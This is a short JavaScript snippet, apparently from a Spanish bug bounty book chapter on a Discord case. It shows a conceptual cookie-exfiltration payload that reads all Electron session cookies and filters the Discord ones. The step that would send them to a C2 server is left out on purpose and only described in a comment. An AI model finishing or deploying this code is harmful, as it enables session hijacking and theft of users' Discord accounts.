// Extraído de: LibroBugBounty/cap-26-caso-discord.md
// Payload de exfiltracion de cookies (concepto, no ejecutado)
const { session } = require('electron');
session.defaultSession.cookies.get({})
    .then(cookies => {
        // Filtrar cookies de discord.com
        const discordCookies = cookies.filter(
            c => c.domain.includes('discord')
        );
        // Enviar a servidor C2
        // (no implementado en el PoC por etica)
    });
